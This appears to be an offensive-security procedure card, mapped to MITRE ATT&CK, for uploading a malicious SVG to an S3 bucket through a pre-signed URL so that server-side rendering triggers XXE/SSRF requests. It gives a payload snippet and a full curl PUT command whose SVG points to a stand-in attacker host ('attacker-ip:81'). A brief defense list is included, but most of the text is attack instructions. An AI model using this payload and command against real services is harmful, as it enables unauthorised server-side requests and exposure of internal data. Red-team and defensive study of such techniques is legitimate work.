---
id: proc-upload-svg-001
tags:
  - upload
  - s3
  - xxe
  - svg
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - AWS
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
updated_at: '2025-12-14T05:32:10.553Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Remote File Copy]]'
---
# Upload-Malicious-SVG-to-S3

## Summary

This procedure uploads a malicious SVG file containing XXE payloads to the S3 bucket using the pre-signed URL, enabling subsequent server-side processing exploits.

## Description

The SVG is uploaded directly to S3 with image/svg+xml header and XML body including entities for XXE. When the server processes or renders the avatar, it parses the XML, triggering fetches. This exploits unvalidated uploads in cloud storage integrations.

## Requirements

1. Pre-signed URL and token from prior steps
2. Malicious SVG payload prepared (e.g., with <image> tags for XXE)
3. HTTP PUT capability

## Defense

Defensive measures and detection strategies:

- Scan uploads for XML entities and malicious tags
- Disable XXE in XML parsers (e.g., set DTD processing to false)
- Use S3 bucket policies to block XML uploads

## Objectives

1. Persist malicious SVG in S3
2. Trigger server-side XML parsing
3. Enable XXE-based attacks

## Instructions

### Step 1: Prepare Payload

**Context**: Create SVG with XXE elements, e.g., for SSRF: <svg><image xlink:href="http://attacker:81/" /></svg>.

No command; edit file manually.

### Step 2: Upload via PUT

**Context**: Send the payload to S3.

**Command** (curl-put-s3-svg):
```bash
curl -X PUT "$preSignedURL" \
  -H "Content-Type: image/svg+xml" \
  --data '<?xml version="1.0"?><svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="http://attacker-ip:81/test" /></svg>'
```

> Expected output: 200 OK. File is now in bucket, ready for render trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Remote File Copy]] Ingress Tool Transfer

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- upload
- s3
- xxe
